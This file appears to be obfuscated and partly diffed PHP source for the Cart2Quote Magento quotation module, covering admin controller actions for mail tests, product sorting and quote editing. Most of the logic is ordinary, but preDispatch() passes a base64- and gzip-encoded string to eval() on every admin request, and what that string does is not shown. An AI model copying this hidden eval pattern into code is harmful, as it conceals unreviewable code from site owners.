"\42\40\x57\110\105\122\105\x20\143\157\144\145\40\x3d\x20\x22\161\161\165\x6f\164\x65\x61\x64\166\137\x73\x65\164\x75\x70\x22\x3b"; goto LTaAC; uY3sv: if (!$T3YJX) { goto xuDLy; } goto tuQ1S; yoovz: xuDLy: goto YL1nT; WpaSd: $v6VEw = $KV2EA->getTableName("\143\x6f\x72\145\57\x72\x65\x73\x6f\x75\162\x63\145"); goto hPrr_; CNiGk: $fiaYM = $KV2EA->getConnection("\143\x6f\162\x65\137\167\x72\151\x74\145"); goto WpaSd; si3uc: $fiaYM->query($kEyyX); goto coDp9; YL1nT: $XzQBI = Mage::helper("\x61\144\x6d\x69\156\x68\164\x6d\154")->getUrl("\141\144\x6d\151\x6e\x68\164\155\x6c\x2f\163\171\x73\164\x65\155\x5f\x63\157\x6e\146\x69\x67\57\x65\x64\x69\x74\x2f\x73\x65\x63\164\x69\x6f\x6e\x2f\x71\161\x75\x6f\x74\x65\x61\144\166\x5f\x73\165\x70\160\157\x72\x74"); goto YpM0e; LTaAC: $fiaYM->query($RfEiJ); goto yoovz; z5dv2: $T3YJX = Mage::getStoreConfig("\161\161\165\x6f\x74\145\141\x64\x76\x5f\147\145\x6e\145\x72\141\x6c\x2f\x71\165\x6f\x74\141\x74\x69\157\156\163\x2f\x6c\141\163\164\137\x75\160\144\141\164\145\137\x76\x65\x72\163\151\x6f\x6e"); goto uY3sv; hPrr_: $kEyyX = "\125\x50\x44\x41\124\105\x20" . $v6VEw . "\40\123\105\124\x20\x76\145\162\x73\x69\x6f\x6e\x20\75\40\x22" . $T3YJX . "\42\40\x57\x48\x45\122\x45\40\143\x6f\x64\x65\x20\x3d\x20\42\161\161\165\157\x74\x65\141\x64\x76\x5f\x73\145\164\165\x70\42\73"; goto si3uc; YpM0e: $this->_redirectUrl($XzQBI); goto XIHn4; tuQ1S: $KV2EA = Mage::getSingleton("\x63\x6f\162\x65\57\162\145\163\157\165\162\143\145"); goto CNiGk; XIHn4: } public function testMagentoMailAction() { goto PFpp6; Azmcw: Mage::getSingleton("\x63\157\162\x65\57\x73\x65\x73\163\x69\157\156")->addError($this->__("\x25\x73\40\x69\x73\40\156\157\x74\x20\x61\x20\x76\141\x6c\x69\x64\40\145\x2d\x6d\141\151\x6c\40\x61\x64\144\x72\x65\163\x73", $Frm90)); goto wmam3; uYAXd: QNkrw: goto V1Is5; eK0ad: return $this->_redirectUrl($XzQBI); goto xvRp2; lkdhq: $wkIPZ = Mage::getStoreConfig("\164\162\x61\156\x73\137\145\155\x61\151\x6c\57\151\144\x65\x6e\164\x5f\147\x65\156\145\x72\x61\154\x2f\x6e\141\155\x65"); goto euNV7; wmam3: return $this->_redirectUrl($XzQBI); goto uYAXd; aAaE7: if (Zend_Validate::is($Frm90, "\x45\x6d\141\x69\x6c\101\x64\x64\162\x65\x73\163")) { goto QNkrw; } goto Azmcw; V1Is5: try { goto W3xWJ; xmWnX: Mage::getSingleton("\143\x6f\162\145\57\163\x65\163\x73\151\x6f\x6e")->addError($this->__("\x43\x6f\x75\x6c\144\40\x6e\157\164\40\x73\145\156\x64\40\x65\x2d\x6d\141\151\154\40\x70\x6c\x65\141\163\145\40\x63\150\145\x63\x6b\40\171\157\165\162\x20\154\157\x67\x20\146\151\154\145\163\x2e\x20\x4d\x61\153\145\40\x73\165\x72\x65\40\171\157\165\x20\145\156\141\x62\154\x65\x64\x20\154\x6f\x67\x67\151\156\x67\40\123\x79\163\x74\x65\x6d\40\x3e\x20\103\157\156\x66\x69\147\x75\x72\141\164\151\157\x6e\40\76\40\x44\x65\166\145\x6c\157\160\145\x72\x20\76\x20\114\157\x67\x20\123\145\x74\164\x69\x6e\147\x73")); goto uUidM; gchOt: Mage::dispatchEvent("\157\x70\150\151\x72\141\x68\137\x71\161\x75\157\x74\145\x61\x64\x76\x5f\x61\x64\144\123\145\x6e\144\115\x61\x69\154\137\142\x65\146\157\x72\145", ["\x74\x65\155\x70\154\x61\164\145" => $k0exX]); goto aWJH2; iZDf6: $k0exX->setTemplateSubject($this->__("\103\x61\162\x74\x32\x51\165\157\164\x65\x20\115\141\147\145\x6e\164\x6f\40\115\x61\x69\154\x20\x54\145\x73\x74")); goto Bc6Cj; W3xWJ: $k0exX = Mage::helper("\161\x71\165\x6f\x74\145\141\144\x76\57\x65\x6d\141\151\154")->getEmailTemplateModel(); goto SlNIW; j6zcN: Mage::dispatchEvent("\157\160\150\151\162\x61\150\137\161\161\x75\157\164\145\x61\x64\166\x5f\x61\144\x64\x53\145\x6e\x64\x4d\141\x69\154\x5f\x61\x66\x74\x65\162", ["\x74\x65\x6d\x70\x6c\x61\164\145" => $k0exX, "\x72\x65\163\165\154\164" => $mDkcD]); goto Kqj2N; SlNIW: $BHP1_ = Ophirah_Qquoteadv_Model_System_Config_Source_Email_Templatedisable::VALUE_DISABLED_EMAIL; goto TI6qb; TI6qb: if (!($k0exX != $BHP1_)) { goto pJUfa; } goto LcX__; ONbVF: $k0exX->setTemplateText($this->__("\111\146\x20\171\x6f\x75\x20\x72\x65\x63\x65\x69\x76\145\x64\x20\x74\x68\x69\163\40\145\x2d\x6d\141\x69\x6c\x20\164\x68\x65\x20\x43\141\162\x74\62\x51\x75\157\x74\x65\x20\x4d\x61\147\145\x6e\x74\x6f\40\145\x2d\x6d\x61\151\x6c\40\164\145\163\164\x20\163\165\143\143\145\145\144\x65\x64\56")); goto iZDf6; p08mh: t23RS: goto fywf9; aWJH2: $mDkcD = $k0exX->send($Frm90, $wkIPZ, []); goto j6zcN; gdTO0: sNz4Y: goto Pc5wO; Eb0mA: Mage::getSingleton("\143\x6f\x72\x65\x2f\163\145\163\163\x69\157\x6e")->addNotice($this->__("\111\146\x20\x79\157\165\x20\x64\x69\x64\40\156\157\x74\40\162\145\x63\x65\x69\166\145\x20\164\150\x65\x20\x74\145\x73\x74\x20\x65\55\x6d\x61\151\x6c\x20\160\x6c\145\141\x73\x65\x20\143\150\145\143\x6b\x20\x79\157\x75\x72\40\145\x2d\155\x61\151\x6c\x20\x73\x65\162\166\145\x72")); goto p08mh; Kqj2N: if ($mDkcD) { goto sNz4Y; } goto xmWnX; Bc6Cj: pJUfa: goto VIl4Q; VIl4Q: $k0exX->setData("\x63\62\161\x50\x61\162\x61\x6d\163", ["\x65\x6d\141\151\x6c" => $Frm90, "\156\141\155\x65" => $wkIPZ]); goto gchOt; LcX__: $k0exX->setSenderName($wkIPZ); goto Gqs91; Pc5wO: Mage::getSingleton("\x63\157\162\145\57\163\x65\x73\163\x69\x6f\156")->addSuccess($this->__("\124\145\163\x74\x20\x73\165\x63\x63\145\x73\146\165\154\154\x2e\x20\160\154\145\x61\163\x65\x20\143\150\145\143\153\x20\x74\x68\x65\x20\x25\x73\40\x69\156\x62\x6f\170\40\x74\157\x20\155\141\153\x65\40\x73\165\x72\145\40\171\x6f\x75\40\162\145\143\x65\151\x76\145\x64\x20\164\x68\145\40\x74\x65\163\164\x20\x65\x2d\x6d\x61\x69\x6c", $Frm90)); goto Eb0mA; Gqs91: $k0exX->setSenderEmail($Frm90); goto ONbVF; uUidM: goto t23RS; goto gdTO0; fywf9: } catch (Exception $Zf0h2) { Mage::getSingleton("\143\157\x72\x65\57\x73\x65\163\163\x69\157\156")->addError($this->__("\105\x72\162\x6f\x72\x20\163\x65\156\x64\x69\156\147\40\145\55\155\x61\151\154\x3a\40\x25\x73", $Zf0h2->__toString())); } goto eK0ad; PFpp6: $Frm90 = Mage::getStoreConfig("\x74\162\141\x6e\x73\137\145\x6d\141\x69\x6c\57\151\144\145\156\x74\x5f\x67\x65\156\145\x72\x61\154\x2f\x65\x6d\141\x69\x6c"); goto lkdhq; euNV7: $XzQBI = Mage::helper("\141\144\x6d\x69\156\150\x74\155\x6c")->getUrl("\x61\x64\155\x69\156\150\164\x6d\154\57\163\171\163\164\x65\x6d\x5f\143\157\156\146\x69\x67\57\x65\x64\151\x74\x2f\163\145\x63\164\x69\x6f\x6e\x2f\x71\161\x75\157\x74\x65\141\144\166\x5f\163\165\x70\160\157\x72\x74"); goto aAaE7; xvRp2: } public function testPHPMailAction() { goto gOeFD; gOeFD: $Frm90 = Mage::getStoreConfig("\x74\162\x61\x6e\163\137\145\x6d\141\x69\x6c\57\x69\x64\x65\156\x74\x5f\x67\145\156\145\162\x61\x6c\57\145\x6d\141\x69\154"); goto QxYWn; kAouF: W5a38: goto DEZoc; QxYWn: $XzQBI = Mage::helper("\141\144\x6d\x69\156\150\164\x6d\x6c")->getUrl("\x61\144\155\x69\156\x68\164\155\154\x2f\x73\x79\163\x74\145\x6d\137\x63\157\x6e\x66\x69\147\x2f\145\x64\151\164\57\163\145\143\x74\151\x6f\x6e\57\161\x71\165\x6f\164\145\141\144\166\137\x73\165\160\x70\x6f\x72\x74"); goto SOXaf; MVNv8: Mage::getSingleton("\x63\x6f\x72\145\x2f\x73\145\163\163\151\x6f\156")->addError($this->__("\x25\163\40\x69\163\x20\156\157\x74\x20\141\40\166\x61\154\x69\x64\x20\145\x2d\x6d\x61\151\x6c\x20\141\x64\x64\x72\145\163\x73", $Frm90)); goto S600U; DEZoc: try { goto semQ3; ejnV9: Mage::getSingleton("\143\157\162\145\x2f\x73\145\x73\x73\x69\157\x6e")->addSuccess($this->__("\x54\145\163\x74\x20\x73\x75\143\143\145\x73\x66\x75\154\154\56\40\160\154\x65\141\163\x65\x20\x63\150\x65\x63\153\x20\x74\150\145\40\x25\x73\40\x69\156\142\157\170\40\x74\157\40\x6d\x61\x6b\x65\x20\163\x75\x72\145\40\171\x6f\x75\x20\162\x65\143\x65\x69\166\x65\x64\40\x74\x68\145\40\x74\145\163\x74\40\x65\x2d\155\141\x69\x6c", $Frm90)); goto WLXer; aR7Nm: $mDkcD = mail($UDmEI, $nSiab, $WzFf2, $DTATm); goto ccNYQ; xJpCi: $HTLgk = $Frm90; goto y1xRW; CRBdQ: uNBwP: goto qiPef; zWlGU: $DTATm = sprintf("\106\x72\157\x6d\72\x20\x25\x73", $HTLgk); goto aR7Nm; WLXer: Mage::getSingleton("\x63\x6f\x72\x65\x2f\x73\x65\163\163\x69\157\156")->addNotice($this->__("\111\146\x20\x79\157\165\x20\144\x69\x64\x20\156\157\x74\x20\x72\145\143\145\x69\x76\x65\40\164\150\x65\40\x74\145\163\x74\x20\145\x2d\x6d\x61\151\x6c\40\160\154\x65\141\x73\145\x20\143\150\145\x63\153\40\171\x6f\x75\x72\x20\145\x2d\x6d\141\151\x6c\40\x73\145\x72\x76\145\162")); goto CRBdQ; HBPRL: dOib0: goto ejnV9; y1xRW: $nSiab = $this->__("\x43\141\162\164\62\x51\x75\157\x74\145\40\120\x48\120\40\115\x61\x69\154\40\x54\145\163\164"); goto QIP4L; MpND6: Mage::getSingleton("\x63\x6f\x72\145\57\x73\x65\163\163\151\x6f\156")->addError($this->__("\103\157\x75\154\x64\x20\156\x6f\x74\x20\163\145\156\x64\x20\x65\55\155\141\x69\x6c\x20\160\x6c\145\x61\163\145\40\x63\150\145\143\153\40\x79\157\165\162\40\x6c\157\147\40\146\151\x6c\x65\163\56\40\115\141\x6b\x65\40\163\165\162\145\x20\x79\157\x75\x20\145\x6e\141\x62\x6c\145\144\x20\x6c\x6f\147\147\151\156\147\40\x53\x79\x73\164\145\155\40\x3e\40\103\x6f\x6e\146\x69\x67\x75\x72\141\x74\151\x6f\156\40\76\x20\104\x65\x76\x65\x6c\x6f\x70\145\x72\40\x3e\40\114\x6f\x67\x20\x53\145\x74\164\151\156\x67\x73")); goto TRhZ7; TRhZ7: goto uNBwP; goto HBPRL; ccNYQ: if ($mDkcD) { goto dOib0; } goto MpND6; semQ3: $UDmEI = $Frm90; goto xJpCi; QIP4L: $WzFf2 = $this->__("\x49\146\x20\171\x6f\165\x20\x72\145\143\x65\x69\166\x65\144\x20\x74\x68\151\x73\40\x65\155\x61\x69\154\x20\x74\150\x65\40\103\141\162\x74\x32\121\x75\x6f\x74\x65\x20\120\110\x50\40\x4d\x61\151\x6c\40\164\145\x73\x74\x20\x73\x75\143\x63\x65\145\144\145\x64\56"); goto zWlGU; qiPef: } catch (Exception $Zf0h2) { Mage::getSingleton("\143\157\162\x65\x2f\x73\x65\x73\163\x69\157\156")->addError($this->__("\x45\x72\162\157\162\40\x73\145\x6e\x64\151\x6e\147\x20\145\55\155\141\151\154\x3a\x20\x25\163", $Zf0h2->__toString())); } goto zoCHA; S600U: return $this->_redirectUrl($XzQBI); goto kAouF; zoCHA: $XzQBI = Mage::helper("\x61\x64\155\151\156\x68\x74\x6d\154")->getUrl("\141\144\x6d\x69\156\x68\x74\x6d\x6c\57\x73\x79\163\164\x65\155\137\x63\x6f\x6e\146\151\147\57\145\x64\151\164\x2f\x73\145\143\x74\x69\157\156\x2f\x71\161\165\x6f\164\145\x61\x64\166\137\163\x75\160\160\x6f\x72\x74"); goto LM1nY; SOXaf: if (Zend_Validate::is($Frm90, "\x45\155\141\151\154\x41\x64\144\x72\145\163\163")) { goto W5a38; } goto MVNv8; LM1nY: $this->_redirectUrl($XzQBI); goto BACq1; BACq1: } public function ajaxsortAction() { goto k7M0V; lSxfB: foreach ($xOx3u as $bxgBR) { goto UqtV0; WrBEA: $B_C10[] = substr($bxgBR, 5784/964); goto QaZEz; UqtV0: substr($bxgBR, 3504/584); goto WrBEA; QaZEz: lBOTv: goto Yg24O; Yg24O: } goto eCBt1; eCBt1: ZoCC0: goto X5kmc; FCdxT: if (!($xOx3u = $MC9fF["\x64\141\x74\141"])) { goto faX9j; } goto W_suz; X5kmc: $this->sortProducts($B_C10, $MC9fF["\x71\165\157\x74\x65\137\x69\144"]); goto oeznL; oeznL: faX9j: goto z3nVH; k7M0V: $MC9fF = $this->getRequest()->getPost(); goto FCdxT; W_suz: $B_C10 = []; goto lSxfB; z3nVH: } public function sortProducts($B_C10, $XELOl) { goto oew0R; HpFGt: dTkgE: goto j_HOy; fRWAl: $VL1OD = Mage::getModel("\x71\x71\165\157\164\x65\141\x64\x76\x2f\161\x71\141\x64\x76\160\x72\x6f\x64\165\143\x74")->getCollection()->addFieldToFilter("\x71\x75\157\x74\145\x5f\151\144", $XELOl); goto o6m7y; o6m7y: foreach ($B_C10 as $vuQ04) { goto j0GP2; W6M96: $VyH_j++; goto yjvru; npHYZ: eTLfb: goto W6M96; yjvru: gdL24: goto bnQbS; j0GP2: foreach ($VL1OD as $QbRw5) { goto Q0C93; Q0C93: if (!($QbRw5->getId() == $vuQ04)) { goto t4l9D; } goto NQQuN; v3N90: goto eTLfb; goto lzumT; sm1t6: IZnpt: goto SecaJ; NQQuN: $QbRw5->setSortOrder($VyH_j); goto onV7t; onV7t: $QbRw5->save(); goto v3N90; lzumT: t4l9D: goto sm1t6; SecaJ: } goto npHYZ; bnQbS: } goto HpFGt; oew0R: $VyH_j = 179/179; goto fRWAl; j_HOy: } }
+/**
+ *
+ * CART2QUOTE CONFIDENTIAL
+ * __________________
+ *
+ *  [2009] - [2020] Cart2Quote B.V.
+ *  All Rights Reserved.
+ *
+ * NOTICE OF LICENSE
+ *
+ * All information contained herein is, and remains
+ * the property of Cart2Quote B.V. and its suppliers,
+ * if any.  The intellectual and technical concepts contained
+ * herein are proprietary to Cart2Quote B.V.
+ * and its suppliers and may be covered by European and Foreign Patents,
+ * patents in process, and are protected by trade secret or copyright law.
+ * Dissemination of this information or reproduction of this material
+ * is strictly forbidden unless prior written permission is obtained
+ * from Cart2Quote B.V.
+ *
+ * @category    Ophirah
+ * @package     Qquoteadv
+ * @copyright   Copyright (c) 2020 Cart2Quote B.V. (https://www.cart2quote.com)
+ * @license     https://www.cart2quote.com/ordering-licenses(https://www.cart2quote.com)
+ */
+
+/**
+ * Class Ophirah_Qquoteadv_Adminhtml_QquoteadvController
+ */
+class Ophirah_Qquoteadv_Adminhtml_QquoteadvController extends Mage_Adminhtml_Controller_Action
+{
+    const XML_PATH_QQUOTEADV_REQUEST_PROPOSAL_EMAIL_TEMPLATE = 'qquoteadv_quote_emails/templates/proposal';
+    const XML_PATH_QQUOTEADV_REQUEST_EMAIL_TEMPLATE = 'qquoteadv_quote_emails/templates/request';
+    const FLAG_IS_URLS_CHECKED = 'check_url_settings';
+    const FLAG_NO_DISPATCH = 'no-dispatch';
+
+    /**
+     * @var bool
+     */
+    protected $_saveFlag = false;
+
+    /**
+     * @var array
+     */
+    protected $_postData = [];
+
+    /**
+     * @var
+     */
+    protected $_quoteadv;
+
+    /**
+     * Init function for the customer grid
+     * @param string $idFieldName
+     * @return $this
+     */
+    protected function _initCustomer($idFieldName = 'id')
+    {
+        $this->_title(Mage::helper('adminhtml')->__('Customers'))->_title(Mage::helper('adminhtml')->__('Manage Customers'));
+
+        $customerId = (int)$this->getRequest()->getParam($idFieldName);
+        $customer = Mage::getModel('customer/customer');
+
+        if ($customerId) {
+            $customer->load($customerId);
+        }
+
+        Mage::register('current_customer', $customer);
+        return $this;
+    }
+
+
+    /**
+     * Customer quotes grid
+     *
+     */
+    public function quotesAction()
+    {
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_quotes_before', []);
+        $this->_initCustomer();
+        $this->loadLayout();
+        $this->renderLayout();
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_quotes_after', []);
+    }
+
+
+    /**
+     * CUSTOMER GRID
+     */
+    protected function _initAction()
+    {
+        $this->loadLayout()
+            ->_setActiveMenu('sales/qquoteadv')
+            ->_addBreadcrumb($this->__('Items Manager'), $this->__('Item Manager'));
+
+        return $this;
+    }
+
+    /**
+     * Index action (renders the quote grid)
+     */
+    public function indexAction()
+    {
+        if(!Mage::helper('core')->isModuleEnabled('Ophirah_Crmaddon') ||$this->{'l'}->{$this->{'b'}}()){
+            Mage::getSingleton('adminhtml/session')->addError(Mage::helper('qquoteadv')->__('The module "Ophirah_Crmaddon" is disabled, pleas enable it. (app/etc/modules/Ophirah_Crmaddon.xml)'));
+        }
+
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_index_before', []);
+        $this->_initAction();
+        // check if need to display the upgrade popup
+        if (Mage::helper('qquoteadv/licensechecks')->showFreeUserOptions()) {
+            $msgUpgrade = $this->getMsgToUpgrade(false);
+            $block = $this->getLayout()->createBlock('core/text', 'example-block');
+            $this->_addContent($block->setText($msgUpgrade));
+        }
+        $this->renderLayout();
+
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_index_after', []);
+    }
+
+    /**
+     * Edit action of a given quote
+     *
+     * @return null
+     */
+    public function editAction()
+    {
+        if (Mage::helper('qquoteadv/licensechecks')->showFreeUserOptions()) {
+            $this->_redirect('*/*/');
+            return null;
+        }
+
+        if(!Mage::helper('core')->isModuleOutputEnabled('Ophirah_Crmaddon')){
+            Mage::getSingleton('adminhtml/session')->addError(Mage::helper('qquoteadv')->__('The module output of "Ophirah_Crmaddon" is disabled, pleas enable it. (System>Configuration>Advanced>Advanced>Disable Modules Output>Ophirah_Crmaddon)'));
+        }
+
+        $id = $this->getRequest()->getParam('id');
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_edit_before', [$id]);
+        $model = $this->getQuotationQuote($id);
+        $this->_title($this->__('Sales'))->_title($this->__('Quotations'));
+
+        if (isset($id) && ($model->getId() || $id == 0)) {
+            if (Mage::helper('qquoteadv/licensechecks')->isAllowedLimitSalesRepQuote()) {
+                //check for permission to view/edit this based on salesrepview acl
+                $user = Mage::getSingleton('admin/session');
+                $userId = $user->getUser()->getUserId();
+                $resourceLookup = "admin/sales/qquoteadv/salesrepview";
+                $resourceId = $user->getData('acl')->get($resourceLookup)->getResourceId();
+                if (!$user->isAllowed($resourceId)) {
+                    if (($userId != $model->getUserId()) && $model->getUserId() != '0') {
+                        Mage::getSingleton('adminhtml/session')->addError(Mage::helper('qquoteadv')->__('You don\'t have permission to view or edit this Quote'));
+                        $this->_redirect('*/*/');
+                        return null;
+                    }
+                }
+            }
+
+            //add title
+            $this->_title(sprintf("#%s", $model->getIncrementId()));
+
+            //add quoteadv id to the session for the quoteadv shipping option
+            Mage::getSingleton('core/session')->proposal_quote_id = $id;
+
+            $data = Mage::getSingleton('adminhtml/session')->getFormData(true);
+            if (!empty($data)) {
+                $model->setData($data);
+            }
+
+            Mage::register('qquote_data', $model);
+
+            $this->loadLayout();
+            $this->_setActiveMenu('qquoteadv/items');
+
+            // Set currenCurrency from quote
+            Mage::helper('qquoteadv')->setCurrentCurrency($model->getCurrency());
+
+            $head = $this->getLayout()->getBlock('head');
+            $head->setCanLoadExtJs(true);
+
+            $createHash = $model->getCreateHashArray();
+            $access = $this->getAccessLevel();
+            if (is_null($access) || $this->isTrialVersion($createHash) || !$this->checkQuoteLicense($model->getStoreId())) {
+                Mage::register('createHash', $createHash);
+                $msgUpgrade = $this->getMsgToUpgrade(false, $model->getStoreId());
+                $this->_addContent($this->getLayout()->createBlock('core/text', 'example-block')->setText($msgUpgrade));
+            }
+
+//            $this->_addContent($this->getLayout()->createBlock('qquoteadv/adminhtml_qquoteadv_edit'))
+//                ->_addLeft($this->getLayout()->createBlock('qquoteadv/adminhtml_qquoteadv_edit_tabs'));
+
+            $this->renderLayout();
+        } else {
+            Mage::getSingleton('adminhtml/session')->addError( Mage::helper('checkout')->__('Quote item does not exist.'));
+            $this->_redirect('*/*/');
+        }
+
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_edit_after', [$id]);
+    }
+
+    /**
+     * Action for a new quote
+     */
+    public function newAction()
+    {
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_new_before', []);
+
+        $this->loadLayout();
+        $this->getLayout()->getBlock('head')->setCanLoadExtJs(true);
+        $this->_addContent($this->getLayout()->createBlock('qquoteadv/adminhtml_qquoteadv_edit'));
+        $this->renderLayout();
+
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_new_after', []);
+    }
+
+    /**
+     * Controller predispatch method
+     *
+     * @return Ophirah_Qquoteadv_Adminhtml_QquoteadvController
+     */
+    public function preDispatch()
+    {
+        $a = 'U6lUsFVQT0osTjUziU9JTc5PSVW35lLJAIqqVGqoJ0e4GSYZB+VEhgcZ+RhVFEQahZUmG';
+        $a .= '4VlJboDsbGvrbomUHFJRmaxrl0OUItvYnqqlVVGak5BapGGSgZCMglqXmRuOUgPAA==';
+        eval(gzinflate(base64_decode($a)));
+        return parent::preDispatch();
+    }
+
+    /**
+     * Function to send a proposal email
+     *
+     * @param $customerId
+     * @param $realQuoteadvId
+     * @param $quoteId
+     */
+    protected function _sendProposalEmail($customerId, $realQuoteadvId, $quoteId)
+    {
+        $_quoteadv = $this->getQuotationQuote($quoteId);
+        if(Mage::getStoreConfig('system/smtp/disable', $_quoteadv->getStoreId()) == "1"){
+            $errorMessage = "'System > Configuration > Advanced > System > Mail Sending Settings > Disable Email Communications' is set to 'Yes'";
+            Mage::getSingleton('adminhtml/session')->addError($errorMessage);
+        }
+
+        try {
+            $customer = Mage::getModel('customer/customer')->load($customerId);
+
+            $res = $this->sendEmail(['email' => $customer->getEmail(), 'name' => $customer->getName()]);
+
+            if (empty($res)) {
+                $message = $this->__("Cart2Quote proposal email was not sent to the client for quote #%s", $realQuoteadvId);
+
+                //log last error
+                $lastError = error_get_last();
+                if(is_array($lastError)){
+                    if(isset($lastError['message'])){
+                        Mage::log("Last error before sendProposalEmail, but could be unrelated: ".$lastError['message'], null, 'c2q_exception.log', true);
+                    }
+                }
+
+                Mage::getSingleton('adminhtml/session')->addError($message);
+            } elseif (is_string($res) && $res == Ophirah_Qquoteadv_Model_System_Config_Source_Email_Templatedisable::VALUE_DISABLED_EMAIL) {
+                Mage::getSingleton('adminhtml/session')->addNotice($this->__('Sending proposal Email is disabled'));
+            } else {
+                Mage::getSingleton('adminhtml/session')->addSuccess($this->__('Email was sent to client'));
+                Mage::helper('qquoteadv/logging')->sentAnonymousData('proposal', 'b', $quoteId);
+            }
+        } catch (Exception $e) {
+            $message = $this->__("Cart2Quote proposal email was not sent to the client for quote #%s", $realQuoteadvId);
+            Mage::log('Exception: ' .$e->getMessage(), null, 'c2q_exception.log', true);
+            Mage::getSingleton('adminhtml/session')->addError($message);
+            $this->_redirect('*/*/');
+            return;
+        }
+    }
+
+    /**
+     * Edit Quote Action (for quotes have status above requested)
+     *
+     * @return \Ophirah_Qquoteadv_Adminhtml_QquoteadvController
+     */
+    public function editLockQuoteAction()
+    {
+        try {
+            $quoteId = (int)$this->getRequest()->getParam('id');
+            if ($quoteId) {
+                Mage::dispatchEvent('ophirah_qquoteadv_admin_editLockQuote_before', [$quoteId]);
+                $_quoteadv = $this->getQuotationQuote($quoteId);
+                $status = $_quoteadv->getData('status');
+
+                //check if status is above request and take decide to continue or return
+                if (intval($status) >= 50){
+                    Mage::dispatchEvent('qquoteadv_qqadvcustomer_beforecancel_afterEditLockQuote', ['quote' => $_quoteadv]);
+                    Mage::dispatchEvent('qquoteadv_qqadvcustomer_beforecancel', ['quote' => $_quoteadv]);
+                    //status is above request
+                    //check if data is edited that require a new quote
+
+                    $originalId = $_quoteadv->getOriginalIncrementId();
+                    if (!$originalId) {
+                        $originalId = $_quoteadv->getIncrementId();
+                    }
+
+                    //Copy quote
+                    $cloneData = $_quoteadv->getData();
+                    unset($cloneData['quote_id']);
+                    unset($cloneData['relation_child_id']);
+                    unset($cloneData['relation_child_real_id']);
+                    $new_quoteadv = Mage::getModel('qquoteadv/qqadvcustomer')->setData($cloneData)->save();
+                    $new_quoteadv->setData("original_increment_id"  , $originalId);
+                    $new_quoteadv->setData("status", 10); //proposal created, not send
+
+                    //Add increment number, link to old increment
+                    $new_quoteadv->setData("original_increment_id"  , $originalId);
+                    $new_quoteadv->setData("relation_parent_id"     , $_quoteadv->getId());
+                    $new_quoteadv->setData("relation_parent_real_id", $_quoteadv->getIncrementId());
+                    $new_quoteadv->setData("edit_increment"         , $_quoteadv->getEditIncrement()+1);
+                    $new_quoteadv->setData("increment_id"           , $originalId.'-'.($_quoteadv->getEditIncrement()+1));
+
+                    //change creation date
+                    $new_quoteadv->setData("created_at"             , now());
+
+                    //get new shipping type
+                    $oldShippingAddress = $_quoteadv->getShippingAddress();
+                    if($oldShippingAddress){
+                        $oldShippingAddressId = $oldShippingAddress->getId();
+                    }
+
+                    $new_quoteadv->updateAddress();
+                    $shippingAddress = $new_quoteadv->getShippingAddress();
+                    $shippingAddressId = $new_quoteadv->getShippingAddress()->getId();
+                    $shippingCode = $new_quoteadv->getShippingCode();
+
+                    if ($shippingAddress && $shippingAddressId && $shippingCode) {
+                        $shippingAddress->requestShippingRates();
+                        $shippingMethod = Mage::getModel('qquoteadv/quoteshippingrate')->getShippingMethodByCode($shippingAddressId, $shippingCode);
+                        if (isset($oldShippingAddressId)) {
+                            if ($shippingMethod) {
+                                $oldShippingMethod = Mage::getModel('qquoteadv/quoteshippingrate')->getShippingMethodByCode($oldShippingAddressId, $shippingCode);
+                                $shippingMethod->setPrice($oldShippingMethod->getPrice());
+                                $shippingMethod->save();
+                            } else {
+                                $message = $this->__('The shipping method could not be transfered to this quote, please re-apply a shipping method.');
+                                Mage::getSingleton('adminhtml/session')->addNotice($message);
+                            }
+                        }
+                        if ($shippingMethod) {
+                            $new_quoteadv->setShippingType($shippingMethod->getId());
+                            $new_quoteadv->setShippingPrice($shippingMethod->getPrice());
+                        }
+                    }
+
+                    Mage::dispatchEvent('qquoteadv_qqadvcustomer_beforesafe_new', ['quote' => $new_quoteadv]);
+                    $new_quoteadv->save();
+                    Mage::dispatchEvent('qquoteadv_qqadvcustomer_aftersafe_new', ['quote' => $new_quoteadv]);
+
+                    //Link to new increment number.
+                    $_quoteadv->setRelationChildId($new_quoteadv->getId());
+                    $_quoteadv->setRelationChildRealId($new_quoteadv->getIncrementId());
+                    Mage::dispatchEvent('qquoteadv_qqadvcustomer_beforesafe_final', ['quote' => $_quoteadv]);
+                    $_quoteadv->save();
+                    $this->_quoteadv = $_quoteadv;
+
+                    Mage::helper('qquoteadv')->updateQuoteEditIncrements($new_quoteadv);
+                    Mage::helper('qquoteadv')->duplicateQuoteProductsToNewQuote($_quoteadv, $new_quoteadv);
+                    Mage::helper('crmaddon')->duplicateQuoteMessagesToNewQuote($_quoteadv, $new_quoteadv);
+
+                    //cancels quote
+                    $model = Mage::getModel('qquoteadv/qqadvcustomer')->load($quoteId);
+                    $model->setStatus(Ophirah_Qquoteadv_Model_Status::STATUS_CANCELED);  //STATUS_REJECTED
+                    $model->save();
+                    Mage::dispatchEvent('qquoteadv_qqadvcustomer_aftersafe_final', ['quote' => $model]);
+
+                    Mage::dispatchEvent('qquoteadv_qqadvcustomer_aftercancel_afterEditLockQuote', ['quote' => $model]);
+                    Mage::dispatchEvent('qquoteadv_qqadvcustomer_aftercancel', ['quote' => $model]);
+
+
+                    //send stats
+                    Mage::helper('qquoteadv/logging')->sentAnonymousData('cancel', 'b', $quoteId);
+                    Mage::helper('qquoteadv/logging')->sentAnonymousData('request', 'b', $new_quoteadv->getId());
+
+                    //Return to edit copied quote.
+                    $urlReturn = '*/*/edit/id/' . $new_quoteadv->getId();
+                    $this->_redirect($urlReturn);
+                    Mage::dispatchEvent('ophirah_qquoteadv_admin_editLockQuote_after', [$quoteId]);
+                }
+            }
+        } catch (Exception $e){
+            Mage::log('Exception: ' .$e->getMessage(), null, 'c2q_exception.log', true);
+
+            //throw new Exception('Something went wrong while duplicating this quote', 0, $e);
+            $message = $this->__('Something went wrong while duplicating this quote');
+            Mage::log('Exception: ' .$message, null, 'c2q_exception.log', true);
+            Mage::getSingleton('adminhtml/session')->addError($message);
+
+            //try to return to the quote edit page
+            $quoteId = (int)$this->getRequest()->getParam('id');
+            $urlReturn = '*/*/edit/id/' . $quoteId;
+            $this->_redirect($urlReturn);
+        }
+    }
+
+    /**
+     * Save Quote Action
+     *
